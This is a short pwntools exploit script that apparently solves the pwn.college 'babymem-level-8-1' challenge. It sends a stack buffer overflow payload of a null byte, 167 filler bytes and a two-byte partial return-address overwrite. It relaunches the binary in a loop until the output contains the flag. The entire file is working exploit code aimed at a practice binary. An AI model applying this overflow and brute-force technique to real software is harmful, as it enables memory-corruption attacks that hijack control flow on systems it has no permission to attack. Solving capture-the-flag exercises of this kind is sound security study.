from pwn import *

elf = ELF("/challenge/babymem-level-8-1")
context.log_level = 'error'  
p = elf.process()

payload = b"\x00" + b"A"*167 + b"\xf9\xc9"

while True:
    p = elf.process()
  
    p.sendline(f'{len(payload)}'.encode())

    p.sendline(payload)
    p.recvuntil(b"Goodbye!")
    flag = p.recvall().decode()
    if 'pwn.college' in flag:
        print(flag)
        break
